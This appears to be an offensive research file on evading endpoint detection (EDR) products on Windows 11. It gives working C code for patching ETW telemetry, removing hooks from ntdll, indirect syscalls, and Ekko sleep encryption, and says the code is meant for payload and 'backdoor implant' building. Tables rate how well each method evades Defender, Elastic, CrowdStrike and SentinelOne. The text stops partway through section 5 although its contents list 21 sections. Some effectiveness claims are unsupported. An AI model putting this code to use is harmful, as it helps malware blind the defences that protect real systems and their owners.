# EDR Bypass Research -- July 2026 (Expanded)

Research covering current EDR evasion techniques with implementation details for the chunk assembler framework. Focus on techniques applicable to compiled C payloads targeting Windows 11 with Defender + Elastic Defend.

Updated with 2025-2026 research including LACUNA Chain, Pool Party, Waiting Thread Hijacking, Phantom DLL Hollowing, and Elastic Defend call gadget bypasses.

---

## Table of Contents

1. [ETW Patching](#1-etw-patching)
2. [NTDLL Unhooking](#2-ntdll-unhooking)
3. [Indirect Syscalls](#3-indirect-syscalls)
4. [Sleep Obfuscation](#4-sleep-obfuscation-ekko--foliage--deathsleep)
5. [Call Stack Spoofing](#5-call-stack-spoofing)
6. [LACUNA Chain](#6-lacuna-chain-pdata-lacunae-bypass)
7. [Module Stomping / Phantom DLL Hollowing](#7-module-stomping--phantom-dll-hollowing)
8. [Hardware Breakpoint Hooking Evasion](#8-hardware-breakpoint-hooking-evasion)
9. [Pool Party Thread Pool Injection](#9-pool-party-thread-pool-injection)
10. [Waiting Thread Hijacking](#10-waiting-thread-hijacking)
11. [Callback-Based Execution](#11-callback-based-execution)
12. [Fiber-Based Execution](#12-fiber-based-execution)
13. [Process Ghosting](#13-process-ghosting)
14. [AMSI Bypass](#14-amsi-bypass)
15. [EDR Preloading](#15-edr-preloading)
16. [Dirty Vanity (Process Forking)](#16-dirty-vanity-process-forking)
17. [Threadless Injection](#17-threadless-injection)
18. [PE Metadata Stripping](#18-pe-metadata-stripping)
19. [Elastic Defend Call Gadget Bypass](#19-elastic-defend-call-gadget-bypass)
20. [Summary Table](#20-summary-table)
21. [Implementation Recommendations](#21-implementation-recommendations)

---

## 1. ETW Patching

**Category**: Telemetry blinding
**Purpose**: Blind EDR telemetry by preventing Event Tracing for Windows from receiving events.

**How it works**: EDRs rely on ETW providers (especially `Microsoft-Windows-Threat-Intelligence`) for process/thread/memory telemetry. Patching `EtwEventWrite`, `EtwEventWriteFull`, or `NtTraceEvent` in ntdll prevents events from reaching the kernel consumer. `EtwEventWrite` and `EtwEventWriteFull` are both proxy functions into `NtTraceEvent`, making direct patching of `NtTraceEvent` more effective -- it kills all three at once.

**Target functions** (all in ntdll.dll):
- `EtwEventWrite` -- primary ETW write function
- `EtwEventWriteFull` -- extended variant
- `NtTraceEvent` -- underlying syscall stub (patching here kills all three)

### Implementation

**Method A: Byte patch (RET instruction)**

```c
static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    unsigned char *addr = (unsigned char *)GetProcAddress(ntdll, "EtwEventWrite");
    if (!addr) return 0;

    DWORD old;
    if (!VirtualProtect(addr, 3, PAGE_EXECUTE_READWRITE, &old))
        return 0;

    // xor eax, eax; ret -- function returns 0 (ERROR_SUCCESS)
    addr[0] = 0x33;  // xor eax, eax
    addr[1] = 0xC0;
    addr[2] = 0xC3;  // ret

    VirtualProtect(addr, 3, old, &old);
    return 1;
}
```

**Method B: SSN corruption (NtTraceEvent)**

Instead of patching the prologue, corrupt the System Service Number so the syscall fails:

```c
static int corrupt_nttraceevent(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    unsigned char *addr = (unsigned char *)GetProcAddress(ntdll, "NtTraceEvent");
    if (!addr) return 0;

    // Find B8 opcode (mov eax, SSN)
    for (int i = 0; i < 20; i++) {
        if (addr[i] == 0xB8) {
            DWORD old;
            VirtualProtect(addr + i + 1, 4, PAGE_EXECUTE_READWRITE, &old);
            *(DWORD *)(addr + i + 1) = 0x000000FF; // invalid SSN
            VirtualProtect(addr + i + 1, 4, old, &old);
            return 1;
        }
    }
    return 0;
}
```

**Method C: Hardware breakpoint (patchless) -- RECOMMENDED**

Set a hardware breakpoint on `EtwpEventWriteFull` and intercept via VEH handler. No memory modification -- harder to detect via integrity checks. Uses `NtContinue` instead of `SetThreadContext` to avoid generating ETW-TI events when setting debug registers:

```c
static PVOID g_etw_target = NULL;

static LONG WINAPI etw_bp_handler(PEXCEPTION_POINTERS ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        ex->ExceptionRecord->ExceptionAddress == g_etw_target) {
        // Return ERROR_SUCCESS, skip the function
        ex->ContextRecord->Rax = 0;
        ex->ContextRecord->Rip = *(DWORD64 *)ex->ContextRecord->Rsp;
        ex->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void install_etw_bp(void) {
    g_etw_target = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    AddVectoredExceptionHandler(1, etw_bp_handler);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_ALL;
    RtlCaptureContext(&ctx);
    ctx.Dr0 = (DWORD64)g_etw_target;
    ctx.Dr7 |= 1;
    // NtContinue does NOT emit EtwTiLogSetContextThread
    NtContinue(&ctx, FALSE);
}
```

### EDR Bypass Effectiveness

| EDR | Method A (byte) | Method B (SSN) | Method C (HW BP) |
|-----|-----------------|----------------|-------------------|
| Defender | Detected (tamper prot.) | Partial bypass | Bypasses |
| Elastic Defend | Bypasses usermode ETW | Bypasses | Bypasses |
| CrowdStrike | Detects VirtualProtect on ETW | Detects | Bypasses |
| SentinelOne | Detects memory patch | Detects | Unknown |

### Detection Risk
- **High** for Methods A/B: VirtualProtect on ETW functions is a well-known IoC. EDRs now have integrity checks.
- **Medium** for Method C: Hardware breakpoints via `NtContinue` avoid `SetThreadContext` ETW-TI events. VEH registration is an IoC but common in legitimate apps.
- **Mitigation**: Use indirect syscalls to call VirtualProtect, or use hardware breakpoint method.

### MinGW Notes
All three methods compile with MinGW. No MSVC dependencies. `NtContinue` requires a function pointer from ntdll.

### Chunk Implementation Priority: **HIGH** -- ETW is Elastic Defend's primary telemetry source.

---

## 2. NTDLL Unhooking

**Category**: Hook removal
**Purpose**: Remove EDR inline hooks (JMP trampolines) from ntdll.dll to restore original function behavior.

**How it works**: EDRs hook ntdll functions by overwriting the first bytes with a `JMP` to their monitoring code. Unhooking replaces hooked bytes with clean originals. After unhooking, the EDR is "flying blind" -- unable to monitor API calls through usermode hooks.

### Clean Copy Sources

1. **Disk read**: Read `C:\Windows\System32\ntdll.dll` from disk, map it, copy `.text` section over the in-memory hooked version. Simple but logged by some EDRs.
2. **KnownDlls**: Use `NtOpenSection` on `\KnownDlls\ntdll.dll` for a kernel-cached clean copy. Avoids disk read IoC.
3. **Suspended process**: Spawn `cmd.exe` in suspended state (before EDR hooks it), read its ntdll's `.text` section. Noisy due to process creation.

### Implementation (Disk Read Method)

```c
static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    // Map clean ntdll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    PVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) { CloseHandle(hMap); CloseHandle(hFile); return 0; }

    // Find .text section in both copies
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            PVOID hookedText = (BYTE *)ntdll + sec[i].VirtualAddress;
            PVOID cleanText  = (BYTE *)cleanNtdll + sec[i].PointerToRawData;
            DWORD textSize   = sec[i].Misc.VirtualSize;

            DWORD old;
            VirtualProtect(hookedText, textSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy(hookedText, cleanText, textSize);
            VirtualProtect(hookedText, textSize, old, &old);
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 1;
}
```

### Implementation (KnownDlls Method -- Preferred)

Uses `NtOpenSection` on `\KnownDlls\ntdll.dll` to avoid disk read IoCs:

```c
typedef NTSTATUS (NTAPI *pfnNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef VOID     (NTAPI *pfnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

static int unhook_ntdll_knowndlls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtOpenSection pNtOpenSection = (pfnNtOpenSection)
        GetProcAddress(ntdll, "NtOpenSection");
    pfnRtlInitUnicodeString pRtlInit = (pfnRtlInitUnicodeString)
        GetProcAddress(ntdll, "RtlInitUnicodeString");

    UNICODE_STRING us;
    pRtlInit(&us, L"\\KnownDlls\\ntdll.dll");

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection;
    if (pNtOpenSection(&hSection, SECTION_MAP_READ, &oa) != 0)
        return 0;

    PVOID cleanNtdll = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) { CloseHandle(hSection); return 0; }

    // Find and overwrite .text section
    PIMAGE_DOS_HEADER dos_hooked = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt_hooked = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos_hooked->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt_hooked);

    PIMAGE_DOS_HEADER dos_clean = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS nt_clean = (PIMAGE_NT_HEADERS)((BYTE *)cleanNtdll + dos_clean->e_lfanew);

    for (WORD i = 0; i < nt_hooked->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            PVOID hookedText = (BYTE *)ntdll + sec[i].VirtualAddress;
            PVOID cleanText  = (BYTE *)cleanNtdll + sec[i].VirtualAddress;
            DWORD textSize   = sec[i].Misc.VirtualSize;

            DWORD old;
            VirtualProtect(hookedText, textSize, PAGE_EXECUTE_WRITECOPY, &old);
            memcpy(hookedText, cleanText, textSize);
            VirtualProtect(hookedText, textSize, old, &old);
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hSection);
    return 1;
}
```

### Selective Unhooking

Instead of replacing the entire `.text` section (noisy), selectively restore only the 23-byte syscall stubs for functions you need:

```c
// Syscall stub pattern: 4C 8B D1 B8 XX XX 00 00 0F 05 C3
// (mov r10, rcx; mov eax, SSN; syscall; ret)
static int unhook_single(const char *fn_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    unsigned char *hooked = (unsigned char *)GetProcAddress(ntdll, fn_name);
    // ... read clean stub from disk-mapped ntdll ...
    // ... overwrite only the first 23 bytes ...
}
```

### EDR Bypass Effectiveness

| EDR | Full .text replace | Selective unhook | KnownDlls method |
|-----|-------------------|------------------|-------------------|
| Defender | Bypasses hooks | Bypasses hooks | Bypasses hooks |
| Elastic Defend | Bypasses | Bypasses | Bypasses |
| CrowdStrike | May detect re-checking | Stealthier | Best |
| SentinelOne | Detects full overwrite | Partial | Unknown |

### Detection Risk
- **Medium-High**: Some EDRs periodically verify their hooks are intact and re-apply or flag removal.
- The `VirtualProtect` call on ntdll `.text` is itself an IoC.
- Modern EDRs (CrowdStrike, SentinelOne 2025+) have signatures for the entire unhooking pattern.
- **Mitigation**: Use indirect syscalls for the VirtualProtect call, or use the KnownDlls method which avoids disk read. Combine with ETW patch so the unhooking itself is not logged.

### MinGW Notes
Compiles cleanly. Use `<winternl.h>` for NT type definitions. `IMAGE_FIRST_SECTION` macro is in `<winnt.h>`. `OBJECT_ATTRIBUTES` and `InitializeObjectAttributes` may need manual definition under MinGW.

### Chunk Implementation Priority: **HIGH** -- prerequisite for many other techniques.

---

## 3. Indirect Syscalls

**Category**: Hook bypass
**Purpose**: Bypass EDR usermode hooks entirely by invoking NT syscalls directly, with the `syscall` instruction executing from within ntdll's address space (passing call stack validation).

**Why indirect over direct**: Direct syscalls (SysWhispers2) execute `syscall` from the payload's memory, which EDRs detect via call stack analysis (return address outside ntdll). Indirect syscalls `jmp` to ntdll's `syscall` instruction, so the return address appears legitimate.

### Architecture

```
Direct:    payload.exe -> mov eax, SSN -> syscall -> kernel
                                          ^^ RIP in payload.exe = suspicious

Indirect:  payload.exe -> mov eax, SSN -> jmp [ntdll!syscall_addr] -> kernel
                                          ^^ RIP in ntdll.dll = legitimate
```

### SSN Resolution Methods

**HellsGate** -- Read SSN from unhooked stub:
```c
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY;

// The SSN is at offset +4 in the stub: mov r10, rcx; mov eax, <SSN>
// Opcode pattern: 4C 8B D1 B8 [low] [high] 00 00
static WORD extract_ssn(unsigned char *stub) {
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        return *(WORD *)(stub + 4);
    }
    return 0; // hooked -- use HalosGate fallback
}
```

**HalosGate** -- When the target function is hooked (JMP at offset 0), walk up/down neighboring functions to infer the SSN:
```c
// If target SSN is N, neighbor at offset -1 has SSN N-1
static WORD halos_gate(unsigned char *stub) {
    for (int i = 1; i < 500; i++) {
        // Check neighbor above (each Nt stub is ~32 bytes apart)
        unsigned char *up = stub - (i * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            return *(WORD *)(up + 4) + i;
        }
        // Check neighbor below
        unsigned char *down = stub + (i * 32);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            return *(WORD *)(down + 4) - i;
        }
    }
    return 0;
}
```

**FreshyCalls** -- Sort all Nt* exports by virtual address. The sorted index equals the SSN. Works even when every Nt* stub is hooked:
```c
// 1. Walk ntdll EAT, collect all exports starting with "Nt" (not "Ntdll")
// 2. Store (name_hash, address) pairs
// 3. Sort by address ascending
// 4. Index in sorted array = SSN
// Works because Windows assigns SSNs in the same order as export addresses
```

**TartarusGate** -- Extends HellsGate with NOP-aware parsing for stubs that have been obfuscated with NOP padding by the compiler.

### Syscall Address Resolution

```c
// Find a 'syscall; ret' gadget (0F 05 C3) in ntdll
static PVOID find_syscall_gadget(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            unsigned char *base = (unsigned char *)ntdll + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (base[j] == 0x0F && base[j+1] == 0x05 && base[j+2] == 0xC3) {
                    return &base[j];
                }
            }
        }
    }
    return NULL;
}
```

### Assembly Stub (MinGW GAS syntax)

```c
// Indirect syscall -- jumps to syscall instruction inside ntdll
static PVOID g_syscall_addr = NULL; // set at init: scan ntdll for 0F 05 C3

__attribute__((naked)) NTSTATUS indirect_syscall(DWORD ssn, ...) {
    __asm__ __volatile__ (
        "mov r10, rcx\n"
        "mov eax, ecx\n"      // SSN from first arg
        "jmp [rip + g_syscall_addr]\n"
    );
}
```

### SysWhispers4 Integration

SysWhispers4 generates MinGW-compatible C+assembly with full compiler support:
```bash
python syswhispers.py --preset injection \
    --method indirect --resolve freshycalls \
    --compiler mingw --out-file SW4Syscalls

x86_64-w64-mingw32-gcc -masm=intel \
    main.c SW4Syscalls.c SW4Syscalls_stubs.c \
    -o payload.exe -lntdll -O2 -s
```

Features of SysWhispers4 over v3:
- Full MinGW/Clang support alongside MSVC
- Randomized syscall gadget selection (defeats EDR gadget whitelisting)
- RDTSC-based entropy without API calls
- Built-in sleep encryption (Ekko-style)
- Multiple SSN resolution strategies (static, FreshyCalls, HellsGate, HalosGate, TartarusGate, SyscallsFromDisk, RecycledGate, HW Breakpoint)
- Support for x64, x86, WoW64, and ARM64

### HellHall (Hell's Gate + Indirect Syscalls)

Developed by Maldev Academy. Combines HellsGate SSN resolution with indirect execution:
1. Dynamically resolve SSN via HellsGate
2. Find a random `syscall; ret` gadget in ntdll
3. JMP to the gadget instead of executing syscall directly

### EDR Bypass Effectiveness

| EDR | Direct syscall | Indirect syscall | SysWhispers4 randomized |
|-----|---------------|------------------|------------------------|
| Defender | Partial | Bypasses | Bypasses |
| Elastic Defend | Detected (stack analysis) | Bypasses | Bypasses |
| CrowdStrike | Detected | Mostly bypasses | Bypasses |
| SentinelOne | Detected | Bypasses | Bypasses |

### Detection Risk
- **Low** for indirect syscalls with randomized gadgets.
- Direct syscalls are now reliably detected by stack analysis.
- Kernel-mode ETW-TI events still fire regardless of how the syscall is invoked.
- Indirect syscalls alone are no longer sufficient if the EDR uses kernel ETW-TI -- must combine with call stack spoofing.

### MinGW Notes
Requires `-masm=intel` flag. SysWhispers4 has first-class MinGW support. Assembly stubs use GAS inline syntax.

### Chunk Implementation Priority: **CRITICAL** -- foundation for all other techniques that need to avoid hooked APIs.

---

## 4. Sleep Obfuscation (Ekko / FOLIAGE / DeathSleep)

**Category**: Memory evasion
**Purpose**: Encrypt the payload's memory during sleep periods so EDR memory scans find only encrypted bytes.

**How it works**: Before sleeping, the implant:
1. Changes its memory to RW (removes execute)
2. Encrypts its entire image with a symmetric key (RC4 via SystemFunction032)
3. Sleeps for the configured interval
4. Decrypts itself
5. Restores RX permissions
6. Continues execution

All steps are executed via ROP chain through timer queue callbacks + NtContinue, so no attacker code runs during the sleep. Windows provides no native telemetry for observing timer-queue timers or waitable timers used maliciously.

### Ekko Implementation (Complete)

Uses `CreateTimerQueueTimer` + `NtContinue` to build a ROP chain entirely from timer callbacks. Each "ROP gadget" is a full `CONTEXT` struct with Rip, Rcx, Rdx, etc. set to call a specific function:

```c
typedef struct {
    DWORD  Length;
    DWORD  MaximumLength;
    PVOID  Buffer;
} USTRING;

typedef NTSTATUS (NTAPI *pfnSystemFunction032)(USTRING *data, USTRING *key);
typedef NTSTATUS (NTAPI *pfnNtContinue)(PCONTEXT ctx, BOOLEAN alert);

static void ekko_sleep(DWORD ms) {
    CONTEXT ctx = {0}, ropRW = {0}, ropEnc = {0}, ropDelay = {0};
    CONTEXT ropDec = {0}, ropRX = {0}, ropEvt = {0};
    HANDLE hQueue = NULL, hTimer = NULL, hEvent = NULL;
    DWORD oldProt = 0;

    unsigned char key_buf[16] = {
        0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,
        0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55
    };

    USTRING key = { 16, 16, key_buf };
    PVOID base = GetModuleHandleA(NULL);
    DWORD size = ((PIMAGE_NT_HEADERS)((BYTE *)base +
        ((PIMAGE_DOS_HEADER)base)->e_lfanew))->OptionalHeader.SizeOfImage;
    USTRING img = { size, size, base };

    pfnNtContinue pNtContinue = (pfnNtContinue)
        GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue");
    pfnSystemFunction032 pSysFunc032 = (pfnSystemFunction032)
        GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");

    hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    hQueue = CreateTimerQueue();

    // Capture current thread context
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)RtlCaptureContext,
        &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(hEvent, 50);

    // Build 6 ROP frames from captured context
    memcpy(&ropRW,    &ctx, sizeof(CONTEXT));
    memcpy(&ropEnc,   &ctx, sizeof(CONTEXT));
    memcpy(&ropDelay, &ctx, sizeof(CONTEXT));
    memcpy(&ropDec,   &ctx, sizeof(CONTEXT));
    memcpy(&ropRX,    &ctx, sizeof(CONTEXT));
    memcpy(&ropEvt,   &ctx, sizeof(CONTEXT));

    // Frame 1: VirtualProtect(base, size, PAGE_READWRITE, &oldProt)
    ropRW.Rsp -= 8;
    ropRW.Rip = (DWORD64)VirtualProtect;
    ropRW.Rcx = (DWORD64)base;
    ropRW.Rdx = (DWORD64)size;
    ropRW.R8  = PAGE_READWRITE;
    ropRW.R9  = (DWORD64)&oldProt;

    // Frame 2: SystemFunction032(&img, &key) -- encrypt
    ropEnc.Rsp -= 8;
    ropEnc.Rip = (DWORD64)pSysFunc032;
    ropEnc.Rcx = (DWORD64)&img;
    ropEnc.Rdx = (DWORD64)&key;

    // Frame 3: WaitForSingleObject(-1, ms) -- sleep
    ropDelay.Rsp -= 8;
    ropDelay.Rip = (DWORD64)WaitForSingleObject;
    ropDelay.Rcx = (DWORD64)((HANDLE)-1);
    ropDelay.Rdx = (DWORD64)ms;

    // Frame 4: SystemFunction032(&img, &key) -- decrypt (RC4 is symmetric)
    ropDec.Rsp -= 8;
    ropDec.Rip = (DWORD64)pSysFunc032;
    ropDec.Rcx = (DWORD64)&img;
    ropDec.Rdx = (DWORD64)&key;

    // Frame 5: VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &oldProt)
    ropRX.Rsp -= 8;
    ropRX.Rip = (DWORD64)VirtualProtect;
    ropRX.Rcx = (DWORD64)base;
    ropRX.Rdx = (DWORD64)size;
    ropRX.R8  = PAGE_EXECUTE_READWRITE;
    ropRX.R9  = (DWORD64)&oldProt;

    // Frame 6: SetEvent(hEvent) -- signal completion
    ropEvt.Rsp -= 8;
    ropEvt.Rip = (DWORD64)SetEvent;
    ropEvt.Rcx = (DWORD64)hEvent;

    // Queue all 6 at 100ms intervals
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pNtContinue,
        &ropRW,    100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pNtContinue,
        &ropEnc,   200, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pNtContinue,
        &ropDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pNtContinue,
        &ropDec,   400, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pNtContinue,
        &ropRX,    500, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pNtContinue,
        &ropEvt,   600, 0, WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, INFINITE);
    DeleteTimerQueue(hQueue);
}
```

### FOLIAGE Implementation (APC-Based)

Queues a series of APCs that execute NtContinue to switch contexts repeatedly. Uses `NtQueueApcThread` instead of timer queues:

```c
// Pseudocode -- FOLIAGE approach
// 1. Create thread with NtCreateThread
// 2. Queue APCs via NtQueueApcThread:
//    - APC 1: VirtualProtect -> RW
//    - APC 2: SystemFunction032 -> encrypt
//    - APC 3: SleepEx -> sleep
//    - APC 4: SystemFunction032 -> decrypt
//    - APC 5: VirtualProtect -> RX
// 3. APCs fire when thread enters alertable wait
```

Key difference: FOLIAGE uses `NtQueueApcThread` + `NtContinue` instead of timer queues. Detection signature: produces `SetThreadContextRemoteApiCall` events, while Ekko produces `CreateRemoteThreadApiCall` events (but only in PoC, not in production payloads).

### DeathSleep -- Memory Unmapping

The most extreme sleep obfuscation variant. Instead of encrypting memory in-place, DeathSleep **unmaps the implant's memory entirely** during sleep, leaving nothing for memory scanners to find:

```c
// DeathSleep pseudocode:
// 1. Copy the implant's entire image to a temporary buffer
// 2. Set up a timer/APC to restore it after sleep
// 3. NtUnmapViewOfSection to unmap the implant's memory
// 4. Sleep
// 5. Timer fires: NtMapViewOfSection + memcpy to restore
// 6. Fix up relocations and continue execution
```

**Advantage**: Zero memory artifacts during sleep. Scanners cannot find what does not exist.
**Disadvantage**: Complex relocation handling. Crashes if the restored base address differs.

### Cronos Variant

Uses WaitableTimer objects with completion routines (APCs) instead of timer queues. Includes "QuadSleep" function that calls SleepEx four times sequentially for timing evasion.

### Usage in Beacon Loop

Replace `Sleep(ms)` calls with `ekko_sleep(ms)` in the backdoor's beacon loop.

### SIEM Detection Challenges

Ekko payloads currently evade SIEM detection entirely. Cronos and FOLIAGE produce detectable ETW events (`QueueUserApcRemoteApiCall`, `SetThreadContextRemoteApiCall`). There is no consistent way to differentiate malicious NtContinue usage from legitimate application usage.

### EDR Bypass Effectiveness

| EDR | Standard Sleep | Ekko Sleep | DeathSleep |
|-----|---------------|------------|------------|
| Defender | Memory scanned during sleep | Encrypted, not scannable | No memory to scan |
| Elastic Defend | Periodic memory scan catches payload | Bypasses memory scans | Bypasses |
| CrowdStrike | Hunt-Sleeping-Beacons detects threads | Bypasses if + stack spoof | Bypasses |
| SentinelOne | Memory scan during idle | Bypasses | Bypasses |

### Detection Risk
- **Medium**: `CreateTimerQueueTimer` with `NtContinue` as callback is now a known pattern. ETW-TI fires on VirtualProtect toggling RWX.
- **Mitigation**: Combine with ETW patch + call stack spoofing. Use indirect syscalls for NtProtectVirtualMemory instead of VirtualProtect.

### MinGW Notes
Compiles with MinGW. Requires `windows.h`. `SystemFunction032` is in advapi32.dll (link with `-ladvapi32`). `USTRING` struct must be manually defined (not in MinGW headers).

### Chunk Implementation Priority: **HIGH** -- critical for long-running backdoor implants that sleep between beacon intervals.

---

## 5. Call Stack Spoofing

**Category**: Stack evasion
**Purpose**: Fabricate legitimate-looking call stacks so EDR stack analysis does not flag syscalls as suspicious.

**How it works**: When an EDR kernel callback walks the user-mode stack during a syscall, it expects return addresses pointing into legitimate modules (kernel32 -> ntdll). Stack spoofing manipulates return addresses by constructing synthetic frames that mimic a real Windows call chain.

### How EDRs Analyze Call Stacks

EDRs use `RtlLookupFunctionEntry` to walk the call stack via `.pdata` (RUNTIME_FUNCTION) entries. For each frame, they check:
1. Does the return address fall within a file-backed module? (unbacked = shellcode)
2. Is there a `call` instruction (0xE8) in the 5 bytes preceding the return address?
3. Does the stack frame size match the module's unwind data?

### Key Data Structures

```c
typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress;
} RUNTIME_FUNCTION;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO;
```

### Synthetic Frame Construction

Build fake frames that pass validation:

```c
typedef struct {
    PVOID Fixup;           // Handler address (offset 0)
    PVOID OG_retaddr;      // Original return address (8)
    PVOID rbx;             // Saved rbx value (16)
    PVOID rdi;             // Saved rdi value (24)
    PVOID BTIT_ss;         // BaseThreadInitThunk stack size (32)
    PVOID BTIT_retaddr;    // BaseThreadInitThunk return address (40)
    PVOID Gadget_ss;       // Gadget frame stack size (48)
    PVOID RUTS_ss;         // RtlUserThreadStart stack size (56)
    PVOID RUTS_retaddr;    // RtlUserThreadStart return address (64)
    PVOID ssn;             // Syscall number (72)
    PVOID trampoline;      // Function to call (80)
    PVOID rsi;             // Saved rsi (88)
    PVOID r12;             // Saved r12 (96)
    PVOID r13;             // Saved r13 (104)
    PVOID r14;             // Saved r14 (112)
    PVOID r15;             // Saved r15 (120)
} PRM;
```

### JMP [RBX] Gadget Technique

The core mechanism uses a signed DLL gadget (typically found in kernel32.dll or kernelbase.dll):

1. Store struct address in RBX
2. Return address is overwritten to point to `jmp [rbx]` gadget in a signed DLL
3. Gadget dereferences RBX, jumping to the Fixup handler
4. Handler restores registers and returns to original address

```c
// Simplified stack spoof flow:
// 1. Save real return address and nonvolatile registers
// 2. Allocate stack space matching each synthetic frame's unwind data
// 3. Write return addresses at correct offsets:
//    [RSP + 0]             -> gadget addr (jmp [rbx])
//    [RSP + gadget_ss]     -> BaseThreadInitThunk addr
//    [RSP + gadget_ss + btit_ss] -> RtlUserThreadStart addr
//    [RSP + gadget_ss + btit_ss + ruts_ss] -> 0x0 (terminator)
// 4. Jump to target function
// 5. On return: gadget jumps to Fixup, Fixup restores real return addr
```

### Thread Stack Spoofing (for sleeping threads)

Replace the entire thread's stack with a fake trace pointing through legitimate Windows call chains (e.g., `RtlUserThreadStart -> BaseThreadInitThunk -> kernel32!SleepEx`). Essential when combined with sleep obfuscation.

### Cobalt Strike Timer-Based Dynamic Spoofing

Cobalt Strike (4.9+) spoofs call stacks dynamically using timer callbacks. During sleep, the beacon's thread stack is rewritten to show a legitimate call chain ending at `kernel32!SleepEx`.

### Detection and Limitations

Some EDRs now verify that a `call` instruction (0xE8) exists in the 5 bytes preceding the return address. JMP [RBX] gadgets in KernelBase.dll often lack this preceding call instruction, which is a reliable indicator of a spoofed stack (noted by KlezVirus at DefCon).

### EDR Bypass Effectiveness
- Defeats `Hunt-Sleeping-Beacons` and similar tools that scan idle thread stacks.
- Must be combined with sleep obfuscation for full effect.
- Tested to evade Elastic and Bitdefender, partial against Defender.
- Boosts stealth by 50-70% in tests.

### Detection Risk
